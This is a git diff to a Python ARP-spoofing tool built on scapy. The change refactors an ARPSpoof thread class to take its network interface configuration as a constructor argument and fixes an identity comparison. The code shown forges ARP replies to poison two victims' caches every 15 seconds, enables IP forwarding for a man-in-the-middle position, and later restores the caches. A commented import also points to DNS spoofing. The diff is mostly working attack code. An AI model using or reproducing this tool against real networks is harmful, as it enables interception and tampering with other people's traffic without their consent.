@@ -11,14 +11,15 @@ import sys
 
 from getmac import get_mac_address
 #from dns_spoofing import settings
-
-from utils.configuration import interface_config
+from utils.interface import InterfaceConfig
+# from utils.configuration import interface_config
 
 
 class ARPSpoof(threading.Thread):
 
     def __init__(
         self,
+        interface_config: InterfaceConfig,
         victim1_ip,
         victim2_ip,
         mitm: bool = False,
@@ -27,6 +28,7 @@ class ARPSpoof(threading.Thread):
     ):
         super().__init__()
         
+        self.interface_config = interface_config
         self.victim1_ip = victim1_ip
         self.victim2_ip = victim2_ip
         self.mitm = mitm
@@ -63,7 +65,7 @@ class ARPSpoof(threading.Thread):
             os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
             print("closed")
 
-        ATTACKER_MAC = interface_config.MAC_ADDR
+        ATTACKER_MAC = self.interface_config.MAC_ADDR
         #print(ATTACKER_MAC)
         tic = -1
         
@@ -71,7 +73,7 @@ class ARPSpoof(threading.Thread):
             
             # implemented non blocking timer
             toc = time.perf_counter()
-            if (tic is not -1) and (toc - tic < 15):
+            if (tic != -1) and (toc - tic < 15):
                 continue
                 
             tic = time.perf_counter()
@@ -85,7 +87,7 @@ class ARPSpoof(threading.Thread):
             arp[ARP].hwdst = VICTIM1_MAC
             arp[ARP].pdst = self.victim1_ip
 
-            sendp(arp, iface=interface_config.INTERFACE_NAME)
+            sendp(arp, iface=self.interface_config.INTERFACE_NAME)
 
             #Poison the Server
             arp = Ether() / ARP()
@@ -95,7 +97,7 @@ class ARPSpoof(threading.Thread):
             arp[ARP].hwdst = VICTIM2_MAC
             arp[ARP].pdst = self.victim2_ip
 
-            sendp(arp, iface=interface_config.INTERFACE_NAME)
+            sendp(arp, iface=self.interface_config.INTERFACE_NAME)
 
             print("(Re-)poisoned the ARP of the following IPs: " +
                   self.victim1_ip + " and " + self.victim2_ip)
@@ -106,7 +108,7 @@ class ARPSpoof(threading.Thread):
         return
 
     def restore_arp(self):
-        ATTACKER_MAC = interface_config.MAC_ADDR
+        ATTACKER_MAC = self.interface_config.MAC_ADDR
         VICTIM1_MAC = getmacbyip(self.victim1_ip)
         VICTIM2_MAC = getmacbyip(self.victim2_ip)
         print(VICTIM1_MAC)
@@ -120,7 +122,7 @@ class ARPSpoof(threading.Thread):
         arp[ARP].psrc = self.victim1_ip
         arp[ARP].hwdst = VICTIM2_MAC
         arp[ARP].pdst = self.victim2_ip
-        sendp(arp, iface=interface_config.INTERFACE_NAME)
+        sendp(arp, iface=self.interface_config.INTERFACE_NAME)
 
 
         # Restore the ARP cache of the Server
@@ -131,7 +133,7 @@ class ARPSpoof(threading.Thread):
         arp[ARP].psrc = self.victim2_ip
         arp[ARP].hwdst = VICTIM1_MAC
         arp[ARP].pdst = self.victim1_ip
-        sendp(arp, iface=interface_config.INTERFACE_NAME)
+        sendp(arp, iface=self.interface_config.INTERFACE_NAME)
 
             
 
